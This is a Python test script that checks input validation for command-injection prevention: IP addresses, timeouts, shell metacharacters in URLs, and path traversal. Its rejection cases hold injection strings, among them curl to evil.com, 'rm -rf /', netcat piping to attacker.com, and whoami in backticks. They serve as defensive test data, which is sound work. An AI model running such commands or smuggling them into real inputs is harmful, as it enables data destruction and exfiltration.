#!/usr/bin/env python3
"""
Test input validation for command injection prevention.

Tests the validation logic in TestExecutor to ensure proper input sanitization.
"""

import sys
from pathlib import Path


def test_ip_validation():
    """Test IP address validation."""
    print("Testing IP address validation...")

    import ipaddress

    # Valid IPs
    valid_ips = [
        "192.168.1.1",
        "10.0.0.1",
        "172.16.0.1",
        "8.8.8.8",
        "127.0.0.1",
        "::1",  # IPv6 loopback
        "2001:db8::1",  # IPv6
    ]

    for ip in valid_ips:
        try:
            ipaddress.ip_address(ip)
            print(f"  ✓ Valid IP accepted: {ip}")
        except ValueError:
            print(f"  ✗ Valid IP rejected: {ip}")
            return False

    # Invalid IPs (should raise ValueError)
    invalid_ips = [
        "192.168.1.256",  # Out of range
        "not.an.ip",
        "192.168.1.1; curl http://evil.com",
        "192.168.1.1 && rm -rf /",
        "192.168.1.1`whoami`",
        "",
        "192.168.1",
    ]

    for ip in invalid_ips:
        try:
            ipaddress.ip_address(ip)
            print(f"  ✗ Invalid IP accepted: {ip}")
            return False
        except ValueError:
            print(f"  ✓ Invalid IP rejected: {ip}")

    return True


def test_timeout_validation():
    """Test timeout validation logic."""
    print("\nTesting timeout validation...")

    # Valid timeouts
    valid_timeouts = [1, 5, 10, 30, 60]
    for timeout in valid_timeouts:
        if isinstance(timeout, int) and 1 <= timeout <= 60:
            print(f"  ✓ Valid timeout accepted: {timeout}")
        else:
            print(f"  ✗ Valid timeout rejected: {timeout}")
            return False

    # Invalid timeouts
    invalid_timeouts = [
        0,      # Too small
        -1,     # Negative
        61,     # Too large
        100,    # Too large
        "10",   # String
        10.5,   # Float
        None,   # None
    ]

    for timeout in invalid_timeouts:
        if not isinstance(timeout, int) or timeout < 1 or timeout > 60:
            print(f"  ✓ Invalid timeout rejected: {timeout}")
        else:
            print(f"  ✗ Invalid timeout accepted: {timeout}")
            return False

    return True


def test_url_character_validation():
    """Test URL character validation."""
    print("\nTesting URL character validation...")

    dangerous_chars = [';', '&', '|', '`', '$', '\n', '\r']

    # Valid URLs
    valid_urls = [
        "https://github.com/dirkhh/adsb-feeder-image/releases/download/v1.0/test.img.xz",
        "https://github.com/user/repo/releases/download/v2.0.0/file.zip",
    ]

    for url in valid_urls:
        if not any(c in url for c in dangerous_chars):
            print(f"  ✓ Valid URL accepted: {url[:50]}...")
        else:
            print(f"  ✗ Valid URL rejected: {url}")
            return False

    # Invalid URLs with shell metacharacters
    invalid_urls = [
        "https://example.com/file.zip; curl http://evil.com",
        "https://example.com/file.zip && rm -rf /",
        "https://example.com/file.zip | nc attacker.com 1234",
        "https://example.com/file.zip`whoami`",
        "https://example.com/file.zip$HOME",
        "https://example.com/file.zip\nmalicious",
    ]

    for url in invalid_urls:
        if any(c in url for c in dangerous_chars):
            print(f"  ✓ Malicious URL rejected: {url[:50]}...")
        else:
            print(f"  ✗ Malicious URL accepted: {url}")
            return False

    return True


def test_path_validation():
    """Test path validation logic."""
    print("\nTesting path validation...")

    # Test that paths must be relative to expected directory
    current_file = Path(__file__).resolve()
    expected_dir = current_file.parent

    # Valid path (in same directory)
    valid_path = expected_dir / "test-feeder-image.py"

    # Even if it doesn't exist, should be relative to expected_dir
    if valid_path.is_relative_to(expected_dir):
        print(f"  ✓ Path in expected directory: {valid_path.name}")
    else:
        print(f"  ✗ Valid path rejected: {valid_path}")
        return False

    # Invalid paths (path traversal attempts)
    invalid_paths = [
        expected_dir.parent / "malicious.py",
        Path("/etc/passwd"),
        Path("/tmp/evil.py"),
    ]

    for path in invalid_paths:
        if not path.is_relative_to(expected_dir):
            print(f"  ✓ Path traversal blocked: {path}")
        else:
            print(f"  ✗ Path traversal allowed: {path}")
            return False

    return True


def main():
    """Run all validation tests."""
    print("="*70)
    print("Input Validation Tests")
    print("="*70)
    print()

    tests = [
        test_ip_validation,
        test_timeout_validation,
        test_url_character_validation,
        test_path_validation,
    ]

    failed = False
    for test in tests:
        try:
            if not test():
                failed = True
        except Exception as e:
            print(f"  ✗ Test failed with exception: {e}")
            failed = True

    print()
    print("="*70)
    if not failed:
        print("✅ All input validation tests passed!")
        print("="*70)
        return 0
    else:
        print("❌ Some tests failed")
        print("="*70)
        return 1


if __name__ == "__main__":
    sys.exit(main())
